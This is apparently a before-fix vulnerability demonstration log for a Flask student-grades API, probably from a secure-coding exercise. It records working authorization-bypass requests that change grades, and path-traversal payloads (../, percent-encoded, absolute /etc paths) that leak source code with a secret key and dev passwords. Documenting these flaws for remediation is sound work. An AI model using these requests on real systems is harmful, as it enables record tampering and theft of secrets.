@@ -1,0 +1,322 @@
+Manual vulnerability demonstration (before) - 2026-11-17T01:10:51+00:00
+Commit: 14afdb2
+
+================ V1: Grade authorization (F04 + F05) ================
+
+### Initial state (admin)
+$ GET /grades/1001 and /grades/1002
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:55 GMT
+Content-Type: application/json
+Content-Length: 149
+Connection: close
+
+[
+  {
+    "course_id": "SRS",
+    "grade": 14,
+    "student_id": 1001
+  },
+  {
+    "course_id": "SSD",
+    "grade": 16,
+    "student_id": 1001
+  }
+]
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:55 GMT
+Content-Type: application/json
+Content-Length: 76
+Connection: close
+
+[
+  {
+    "course_id": "SRS",
+    "grade": 15,
+    "student_id": 1002
+  }
+]
+
+
+### V1.1 prof_srs (SRS only) reads student 1001 - expected 200 with SRS row only
+$ GET /grades/1001
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 149
+Connection: close
+
+[
+  {
+    "course_id": "SRS",
+    "grade": 14,
+    "student_id": 1001
+  },
+  {
+    "course_id": "SSD",
+    "grade": 16,
+    "student_id": 1001
+  }
+]
+
+
+### V1.2 prof_srs updates unassigned course SSD - expected 403
+$ POST /grades/update {"student_id":1001,"course_id":"SSD","grade":0}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 79
+Connection: close
+
+{
+  "course_id": "SSD",
+  "grade": 0,
+  "status": "ok",
+  "student_id": 1001
+}
+
+
+### V1.3 prof_srs creates record in unassigned course - expected 403
+$ POST /grades/update {"student_id":1002,"course_id":"SSD","grade":20}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 80
+Connection: close
+
+{
+  "course_id": "SSD",
+  "grade": 20,
+  "status": "ok",
+  "student_id": 1002
+}
+
+
+### V1.4 student alice changes own grade - expected 403
+$ POST /grades/update {"student_id":1001,"course_id":"SRS","grade":20}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 80
+Connection: close
+
+{
+  "course_id": "SRS",
+  "grade": 20,
+  "status": "ok",
+  "student_id": 1001
+}
+
+
+### V1.5 student alice reads Bob's grades - expected 403
+$ GET /grades/1002
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 149
+Connection: close
+
+[
+  {
+    "course_id": "SRS",
+    "grade": 15,
+    "student_id": 1002
+  },
+  {
+    "course_id": "SSD",
+    "grade": 20,
+    "student_id": 1002
+  }
+]
+
+
+### V1.6 unauthenticated update - expected 401
+$ POST /grades/update {"student_id":1002,"course_id":"SRS","grade":0}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 79
+Connection: close
+
+{
+  "course_id": "SRS",
+  "grade": 0,
+  "status": "ok",
+  "student_id": 1002
+}
+
+
+### V1.7 assigned professor updates SRS (legitimate) - expected 200
+$ POST /grades/update {"student_id":1001,"course_id":"SRS","grade":18}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 80
+Connection: close
+
+{
+  "course_id": "SRS",
+  "grade": 18,
+  "status": "ok",
+  "student_id": 1001
+}
+
+
+### Final state (admin) - expected: only SRS of 1001 changed to 18
+$ GET /grades/1001 and /grades/1002
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 148
+Connection: close
+
+[
+  {
+    "course_id": "SRS",
+    "grade": 18,
+    "student_id": 1001
+  },
+  {
+    "course_id": "SSD",
+    "grade": 0,
+    "student_id": 1001
+  }
+]
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:56 GMT
+Content-Type: application/json
+Content-Length: 148
+Connection: close
+
+[
+  {
+    "course_id": "SRS",
+    "grade": 0,
+    "student_id": 1002
+  },
+  {
+    "course_id": "SSD",
+    "grade": 20,
+    "student_id": 1002
+  }
+]
+
+
+================ V2: Path traversal in /files (F08) ================
+
+### V2.1 legitimate download - expected 200
+$ GET /files?path=srs-summary.txt
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Content-Disposition: inline; filename=srs-summary.txt
+Content-Type: text/plain; charset=utf-8
+Content-Length: 39
+Last-Modified: Tue, 17 Nov 2026 01:10:58 GMT
+Cache-Control: no-cache
+ETag: "1794877858.0728881-39-2953448370"
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Accept-Ranges: bytes
+Connection: close
+
+Secure Requirements Engineering summary
+
+### V2.2 ../ traversal to application source - expected 400/403/404
+$ GET /files?path=../baseline_secure_coding_api.py (status + leaked secrets)
+HTTP/1.1 200 OK
+app.config["SECRET_KEY"] = "dev-secret-key"
+    "alice": User(username="alice", password="alicepw", role="student", student_id=1001),
+    "bob": User(username="bob", password="bobpw", role="student", student_id=1002),
+        username="prof_srs", password="profpw", role="professor", courses=["SRS"]
+    "admin1": User(username="admin1", password="adminpw", role="admin"),
+
+
+### V2.3 traversal mixed with a valid directory name - expected 400/403/404
+$ GET /files?path=../materials/../requirements.txt
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Content-Disposition: inline; filename=requirements.txt
+Content-Type: text/plain; charset=utf-8
+Content-Length: 12
+Last-Modified: Tue, 17 Nov 2026 00:00:27 GMT
+Cache-Control: no-cache
+ETag: "1794873627.0-12-2472677706"
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Accept-Ranges: bytes
+Connection: close
+
+flaskpytest
+
+### V2.4 percent-encoded traversal - expected 400/403/404
+$ GET /files?path=%2e%2e%2frequirements.txt
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Content-Disposition: inline; filename=requirements.txt
+Content-Type: text/plain; charset=utf-8
+Content-Length: 12
+Last-Modified: Tue, 17 Nov 2026 00:00:27 GMT
+Cache-Control: no-cache
+ETag: "1794873627.0-12-3634040014"
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Accept-Ranges: bytes
+Connection: close
+
+flaskpytest
+
+### V2.5 absolute path - expected 400/403/404
+$ GET /files?path=/etc/hostname
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Content-Disposition: inline; filename=hostname
+Content-Type: application/octet-stream
+Content-Length: 13
+Last-Modified: Tue, 17 Nov 2026 01:10:57 GMT
+Cache-Control: no-cache
+ETag: "1794877857.5895123-13-554042618"
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Accept-Ranges: bytes
+Connection: close
+
+858fb2052f2b
+
+
+### V2.6 unauthenticated download - expected 401
+$ GET /files?path=../baseline_secure_coding_api.py (status + leaked secrets)
+HTTP/1.1 200 OK
+app.config["SECRET_KEY"] = "dev-secret-key"
+    "alice": User(username="alice", password="alicepw", role="student", student_id=1001),
+    "bob": User(username="bob", password="bobpw", role="student", student_id=1002),
+        username="prof_srs", password="profpw", role="professor", courses=["SRS"]
+    "admin1": User(username="admin1", password="adminpw", role="admin"),
+
+
+### V2.7 missing file - expected 404 without internal path
+$ GET /files?path=nope.txt
+HTTP/1.1 500 INTERNAL SERVER ERROR
+Server: Werkzeug/3.1.9 Python/3.10.22
+Date: Tue, 17 Nov 2026 01:10:59 GMT
+Content-Type: application/json
+Content-Length: 111
+Connection: close
+
+{
+  "error": "[Errno 2] No such file or directory: '/app/materials/nope.txt'",
+  "type": "FileNotFoundError"
+}
+
